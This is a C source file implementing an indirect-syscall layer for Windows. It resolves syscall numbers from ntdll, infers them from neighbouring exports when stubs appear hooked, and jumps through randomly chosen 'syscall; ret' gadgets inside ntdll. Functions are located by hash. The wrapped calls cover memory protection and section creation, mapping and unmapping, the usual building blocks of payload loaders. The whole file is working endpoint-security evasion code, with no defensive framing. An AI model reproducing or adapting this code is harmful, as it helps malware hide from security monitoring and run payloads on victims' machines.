#include "pex_syscall.h"

#include <intrin.h>
#include <stdint.h>

#include "pex_native.h"

extern NTSTATUS PexIndirectSyscall(DWORD dwSsn, PVOID pGadget,
                                    ULONG_PTR a1, ULONG_PTR a2,
                                    ULONG_PTR a3, ULONG_PTR a4,
                                    ULONG_PTR a5, ULONG_PTR a6,
                                    ULONG_PTR a7, ULONG_PTR a8,
                                    ULONG_PTR a9, ULONG_PTR a10);

#define PEX_MAX_NT_EXPORTS  512

static DWORD PexReadSsn(PBYTE pStub)
{
    if (pStub == NULL) return 0;

    /* mov r10, rcx ; mov eax, imm32 */
    if (pStub[0] == 0x4C && pStub[1] == 0x8B && pStub[2] == 0xD1 && pStub[3] == 0xB8)
    {
        return *(DWORD*)(pStub + 4);
    }
    return 0;
}

static DWORD PexCollectNtExports(PBYTE pNtdll, PBYTE* pArray, DWORD dwMax)
{
    PIMAGE_DOS_HEADER       pDos = (PIMAGE_DOS_HEADER)pNtdll;
    PIMAGE_NT_HEADERS       pNt;
    PIMAGE_EXPORT_DIRECTORY pExport;
    PDWORD                  pdwNames;
    PDWORD                  pdwFunctions;
    PWORD                   pwOrdinals;
    DWORD                   dwCount = 0;
    DWORD                   i;
    DWORD                   j;

    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return 0;

    pNt = (PIMAGE_NT_HEADERS)(pNtdll + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE) return 0;
    if (pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress == 0) return 0;

    pExport = (PIMAGE_EXPORT_DIRECTORY)(pNtdll +
        pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    pdwNames = (PDWORD)(pNtdll + pExport->AddressOfNames);
    pdwFunctions = (PDWORD)(pNtdll + pExport->AddressOfFunctions);
    pwOrdinals = (PWORD)(pNtdll + pExport->AddressOfNameOrdinals);

    for (i = 0; i < pExport->NumberOfNames && dwCount < dwMax; i++)
    {
        PCSTR szName = (PCSTR)(pNtdll + pdwNames[i]);

        if (szName[0] == 'N' && szName[1] == 't' &&
            szName[2] >= 'A' && szName[2] <= 'Z')
        {
            pArray[dwCount++] = pNtdll + pdwFunctions[pwOrdinals[i]];
        }
    }

    for (i = 1; i < dwCount; i++)
    {
        PBYTE pValue = pArray[i];
        j = i;
        while (j > 0 && pArray[j - 1] > pValue)
        {
            pArray[j] = pArray[j - 1];
            j--;
        }
        pArray[j] = pValue;
    }

    return dwCount;
}

static DWORD PexResolveSsn(PBYTE pNtdll, PVOID pTarget)
{
    PBYTE aExports[PEX_MAX_NT_EXPORTS];
    DWORD dwCount;
    DWORD dwIndex = 0;
    DWORD dwSsn;
    DWORD i;
    BOOL  bFound = FALSE;

    dwSsn = PexReadSsn((PBYTE)pTarget);
    if (dwSsn != 0) return dwSsn;

    dwCount = PexCollectNtExports(pNtdll, aExports, PEX_MAX_NT_EXPORTS);
    for (i = 0; i < dwCount; i++)
    {
        if (aExports[i] == (PBYTE)pTarget)
        {
            dwIndex = i;
            bFound = TRUE;
            break;
        }
    }
    if (!bFound) return 0;

    for (i = 1; i <= PEX_SSN_SCAN && dwIndex >= i; i++)
    {
        dwSsn = PexReadSsn(aExports[dwIndex - i]);
        if (dwSsn != 0) return dwSsn + i;
    }
    for (i = 1; i <= PEX_SSN_SCAN && dwIndex + i < dwCount; i++)
    {
        dwSsn = PexReadSsn(aExports[dwIndex + i]);
        if (dwSsn != 0) return dwSsn - i;
    }

    return 0;
}

static DWORD PexBuildGadgets(PBYTE pNtdll, PVOID* pPool, DWORD dwMax)
{
    PIMAGE_DOS_HEADER     pDos = (PIMAGE_DOS_HEADER)pNtdll;
    PIMAGE_NT_HEADERS     pNt;
    PIMAGE_SECTION_HEADER pSection;
    DWORD                 dwCount = 0;
    WORD                  s;

    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return 0;

    pNt = (PIMAGE_NT_HEADERS)(pNtdll + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE) return 0;

    pSection = IMAGE_FIRST_SECTION(pNt);
    for (s = 0; s < pNt->FileHeader.NumberOfSections && dwCount < dwMax; s++)
    {
        PBYTE pBytes;
        DWORD cbSection;
        DWORD i;

        if ((pSection[s].Characteristics & IMAGE_SCN_MEM_EXECUTE) == 0) continue;

        pBytes = pNtdll + pSection[s].VirtualAddress;
        cbSection = pSection[s].Misc.VirtualSize;

        for (i = 0; i + 2 < cbSection; i++)
        {
            if (pBytes[i] == 0x0F && pBytes[i + 1] == 0x05 && pBytes[i + 2] == 0xC3)
            {
                pPool[dwCount++] = pBytes + i;
                i += 2;
                if (dwCount >= dwMax) break;
            }
        }
    }

    return dwCount;
}

static PVOID PexPickGadget(PPEX_SYSCALL pCtx)
{
    if (pCtx->cGadgets == 0) return NULL;
    return pCtx->aGadgets[(DWORD)(__rdtsc() % pCtx->cGadgets)];
}

BOOL PexSysInit(PPEX_SYSCALL pCtx)
{
    PVOID hNtdll;
    PVOID   pProtect;
    PVOID   pCreateSection;
    PVOID   pMapView;
    PVOID   pUnmapView;

    if (pCtx == NULL) return FALSE;
    ZeroMemory(pCtx, sizeof(*pCtx));

    hNtdll = NativeGetModuleByHash(HASH_NTDLL_DLL);
    if (hNtdll == NULL) return FALSE;

    pProtect = NativeGetProcFromModule(hNtdll, HASH_NTPROTECTVIRTUALMEMORY);
    pCreateSection = NativeGetProcFromModule(hNtdll, HASH_NTCREATESECTION);
    pMapView = NativeGetProcFromModule(hNtdll, HASH_NTMAPVIEWOFSECTION);
    pUnmapView = NativeGetProcFromModule(hNtdll, HASH_NTUNMAPVIEWOFSECTION);

    if (pProtect == NULL || pCreateSection == NULL ||
        pMapView == NULL || pUnmapView == NULL)
    {
        return FALSE;
    }

    pCtx->dwSsnProtect = PexResolveSsn((PBYTE)hNtdll, pProtect);
    pCtx->dwSsnCreateSection = PexResolveSsn((PBYTE)hNtdll, pCreateSection);
    pCtx->dwSsnMapView = PexResolveSsn((PBYTE)hNtdll, pMapView);
    pCtx->dwSsnUnmapView = PexResolveSsn((PBYTE)hNtdll, pUnmapView);

    pCtx->cGadgets = PexBuildGadgets((PBYTE)hNtdll, pCtx->aGadgets, PEX_MAX_GADGETS);

    return pCtx->dwSsnProtect != 0 && pCtx->dwSsnCreateSection != 0 &&
           pCtx->dwSsnMapView != 0 && pCtx->dwSsnUnmapView != 0 &&
           pCtx->cGadgets != 0;
}

NTSTATUS PexSysProtect(PPEX_SYSCALL pCtx, PVOID pAddress, SIZE_T cbSize,
                        DWORD flNewProtect, PDWORD pflOldProtect)
{
    PVOID  pBase = pAddress;
    SIZE_T cbRegion = cbSize;

    return PexIndirectSyscall(pCtx->dwSsnProtect, PexPickGadget(pCtx),
                               (ULONG_PTR)PEX_CURRENT_PROCESS,
                               (ULONG_PTR)&pBase,
                               (ULONG_PTR)&cbRegion,
                               flNewProtect,
                               (ULONG_PTR)pflOldProtect,
                               0, 0, 0, 0, 0);
}

NTSTATUS PexSysCreateSection(PPEX_SYSCALL pCtx, PHANDLE phSection,
                              ACCESS_MASK flDesiredAccess, PVOID pObjectAttributes,
                              PLARGE_INTEGER pliMaximumSize,
                              ULONG flPageProtection, ULONG flAllocationAttributes,
                              HANDLE hFile)
{
    return PexIndirectSyscall(pCtx->dwSsnCreateSection, PexPickGadget(pCtx),
                               (ULONG_PTR)phSection,
                               (ULONG_PTR)flDesiredAccess,
                               (ULONG_PTR)pObjectAttributes,
                               (ULONG_PTR)pliMaximumSize,
                               (ULONG_PTR)flPageProtection,
                               (ULONG_PTR)flAllocationAttributes,
                               (ULONG_PTR)hFile,
                               0, 0, 0);
}

NTSTATUS PexSysMapView(PPEX_SYSCALL pCtx, HANDLE hSection, HANDLE hProcess,
                        PVOID* ppBase, ULONG_PTR ulZeroBits, SIZE_T cbCommitSize,
                        PLARGE_INTEGER pliSectionOffset, PSIZE_T pcbViewSize,
                        ULONG flInheritDisposition, ULONG flAllocationType,
                        ULONG flWin32Protect)
{
    return PexIndirectSyscall(pCtx->dwSsnMapView, PexPickGadget(pCtx),
                               (ULONG_PTR)hSection,
                               (ULONG_PTR)hProcess,
                               (ULONG_PTR)ppBase,
                               (ULONG_PTR)ulZeroBits,
                               (ULONG_PTR)cbCommitSize,
                               (ULONG_PTR)pliSectionOffset,
                               (ULONG_PTR)pcbViewSize,
                               (ULONG_PTR)flInheritDisposition,
                               (ULONG_PTR)flAllocationType,
                               (ULONG_PTR)flWin32Protect);
}

NTSTATUS PexSysUnmapView(PPEX_SYSCALL pCtx, HANDLE hProcess, PVOID pBase)
{
    return PexIndirectSyscall(pCtx->dwSsnUnmapView, PexPickGadget(pCtx),
                               (ULONG_PTR)hProcess,
                               (ULONG_PTR)pBase,
                               0, 0, 0, 0, 0, 0, 0, 0);
}
